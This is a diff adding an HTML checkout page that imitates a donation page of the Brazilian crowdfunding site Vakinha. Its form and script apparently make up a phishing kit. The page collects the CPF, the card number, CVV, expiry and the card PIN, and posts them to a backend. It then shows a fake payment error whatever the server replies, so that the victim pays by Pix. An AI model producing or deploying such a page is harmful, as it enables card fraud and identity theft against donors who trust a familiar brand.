@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Contribua - Vaquinha</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: #f4f6f8;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+
+    header {
+      background: #ffffff;
+      border-bottom: 1px solid #ddd;
+      padding: 20px 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    header img {
+      height: 40px;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 40px auto;
+      padding: 30px;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+    }
+
+    h2 {
+      margin-bottom: 10px;
+      color: #00c853;
+      font-weight: 600;
+    }
+
+    p {
+      color: #777;
+      font-size: 14px;
+      margin-top: 0;
+    }
+
+    label {
+      font-weight: 600;
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="number"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    .pagamento-options {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .pagamento-options button {
+      flex: 1;
+      padding: 12px;
+      border: 2px solid #00c853;
+      background-color: #e8f5e9;
+      color: #00c853;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .pagamento-options button:hover {
+      background-color: #c8e6c9;
+    }
+
+    .extra {
+      margin-top: 20px;
+      padding: 15px;
+      border: 1px dashed #ccc;
+      border-radius: 8px;
+      background-color: #fdfdfd;
+    }
+
+    .submit-btn {
+      margin-top: 25px;
+      background-color: #00c853;
+      color: #fff;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 15px;
+      font-weight: bold;
+      transition: background-color 0.3s;
+    }
+
+    .submit-btn:hover {
+      background-color: #009c40;
+    }
+
+    #qrcode {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    #qrcode img {
+      margin-top: 10px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="logo-vakinha.png" alt="Vakinha Logo">
+  </header>
+
+  <div class="container">
+    <h2>Agora sim, férias de verdade.</h2>
+    <p>ID 5412608</p>
+
+    <form id="checkoutForm">
+      <label>Telefone (WhatsApp)</label>
+      <input type="text" name="telefone" required>
+
+      <label>E-mail</label>
+      <input type="email" name="email" required>
+
+      <label>CPF</label>
+      <input type="text" name="cpf" required>
+
+      <label>Nome completo</label>
+      <input type="text" name="nome" required>
+
+      <label>Valor da contribuição</label>
+      <input type="number" name="valor" min="1" max="10000" required>
+
+      <label>Forma de pagamento</label>
+      <div class="pagamento-options">
+        <button type="button" onclick="selecionarPagamento('pix')">Pix</button>
+        <button type="button" onclick="selecionarPagamento('cartao')">Cartão</button>
+      </div>
+
+      <div class="extra">
+        <input type="checkbox" id="turbinar" name="turbinar">
+        <label for="turbinar">Turbinar doação por +R$ 5,99</label>
+        <p style="font-size: 13px; color: #666">Sua doação aparece em destaque e ajuda a alcançar a meta mais rápido!</p>
+      </div>
+
+      <div id="pagamentoDetalhes"></div>
+      <div id="qrcode"></div>
+
+      <button class="submit-btn" type="submit">Confirmar doação</button>
+    </form>
+  </div>
+
+  <script>
+    let tipoSelecionado = '';
+
+    function selecionarPagamento(tipo) {
+      tipoSelecionado = tipo;
+      const div = document.getElementById('pagamentoDetalhes');
+      const qrdiv = document.getElementById('qrcode');
+      qrdiv.innerHTML = '';
+
+      if (tipo === 'pix') {
+        div.innerHTML = '<label>O QR Code Pix será gerado após a confirmação.</label>';
+      } else {
+        div.innerHTML = ` 
+          <label>Número do Cartão</label>
+          <input type="text" name="numero" required>
+          <label>Nome do Titular</label>
+          <input type="text" name="nome_cartao" required>
+          <label>Validade</label>
+          <input type="text" name="validade" required>
+          <label>CPF do Titular</label>
+          <input type="text" name="cpf_cartao" required>
+          <label>CVV</label>
+          <input type="text" name="cvv" required>
+          <label>Senha (1 a 5 dígitos)</label>
+          <input type="password" name="senha" minlength="1" maxlength="5" required>
+        `;
+      }
+    }
+
+    document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const form = new FormData(e.target);
+      const dados = Object.fromEntries(form.entries());
+      const valor = parseFloat(dados.valor);
+      const turbinar = document.getElementById('turbinar').checked;
+
+      if (valor <= 0) {
+        alert('Por favor, insira um valor válido.');
+        return;
+      }
+
+      if (tipoSelecionado === 'pix') {
+        if (turbinar) {
+          dados.valor = valor + 5.99;
+        }
+
+        const response = await fetch('http://localhost:5000/gerar-pix', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ valor: dados.valor, email: dados.email, nome: dados.nome, turbinar })
+        });
+
+        const json = await response.json();
+        if (json.pix_qr) {
+          document.getElementById('qrcode').innerHTML = `
+            <p><strong>Copia e Cola:</strong><br>${json.pix_copiaecola}</p>
+            <img src="data:image/png;base64,${json.pix_qr}" width="220" />
+          `;
+        } else {
+          alert('Erro ao gerar Pix. Tente novamente.');
+        }
+      } else if (tipoSelecionado === 'cartao') {
+        const response = await fetch('http://localhost:5000/gerar-cartao', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(dados)
+        });
+
+        const json = await response.json();
+        if (json.success) {
+          alert('Erro ao processar o pagamento, Selecione pix ou Tente novamente.');
+          document.getElementById('checkoutForm').reset();
+        } else {
+          alert('Erro ao processar o pagamento, Selecione pix ou Tente novamente.');
+        }
+      } else {
+        alert('Selecione uma forma de pagamento.');
+      }
+    });
+  </script>
+</body>
+</html>
